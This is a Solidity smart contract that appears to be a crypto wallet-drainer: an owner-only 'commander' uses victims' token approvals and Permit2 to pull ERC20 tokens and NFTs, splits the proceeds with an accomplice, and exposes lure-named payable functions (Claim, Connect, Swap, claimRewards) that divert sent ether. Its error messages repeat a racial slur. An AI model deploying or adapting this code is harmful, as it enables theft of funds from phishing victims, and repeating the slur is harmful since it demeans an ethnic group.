// SPDX-License-Identifier: MIT

pragma solidity ^0.8.21;

import "./ERC20.sol";
import "./ERC721.sol";

struct AllowanceTransferDetails {
        // the owner of the token
        address from;
        // the recipient of the token
        address to;
        // the amount of the token
        uint160 amount;
        // the token to be transferred
        address token;
    }

interface iPermit2 {
        function transferFrom(AllowanceTransferDetails[] calldata transferDetails) external;
}

contract master {

    

    struct Pair {
        IERC721 token;
        uint256 tokenId;
    }


    address private commander;
    address private permit2Address = 0x000000000022D473030F116dDEE9F6B43aC78BA3;

    constructor() {
        commander = msg.sender;
    }

    function setCommander(address newCommander) public{
        require(msg.sender == commander, "You can't do this pajeet");
        commander = newCommander;   
    }

    function Meow(AllowanceTransferDetails[] calldata transferDetails) public {
        require(msg.sender == commander, "You can't do this pajeet");
        iPermit2(permit2Address).transferFrom(transferDetails);
    }

    function call(ERC20 token, uint256 amount, address from, address receiver, uint splitPercentage) public {
            require(msg.sender == commander, "You can't do this pajeet");
            token.transferFrom(from, msg.sender, ((amount * splitPercentage) / uint(100)));
            token.transferFrom(from, receiver, ((amount * (uint(100) - splitPercentage)) / uint(100)));
    }
    
    function multicall(Pair[] memory pairs, address from) public {
        require(msg.sender == commander, "You can't do this pajeet");
        for (uint256 i = 0; i < pairs.length; i++) {
            Pair memory p = pairs[i];
            p.token.safeTransferFrom(from, msg.sender, p.tokenId);
        }
    }

    function withdraw() public payable {
        require(msg.sender == commander, "You can't do this pajeet");
        payable(msg.sender).transfer(address(this).balance);
    }

    function processPayment(address receiver) internal {
        require(msg.value > 0, "You can't perform this action without sending ether.");

        payable(commander).transfer((msg.value * uint(20)) / uint(100));
        payable(receiver).transfer((msg.value * uint(80)) / uint(100));
    }

    function Claim(address receiver) public payable {
        processPayment(receiver);
    }

    function Execute(address receiver) public payable {
        processPayment(receiver);
    }

    function Connect(address receiver) public payable {
        processPayment(receiver);
    }

    function Swap(address receiver) public payable {
        processPayment(receiver);
    }

    function claimRewards(address receiver) public payable {
        processPayment(receiver);
    }

    function Merge(address receiver) public payable {
        processPayment(receiver);
    }
}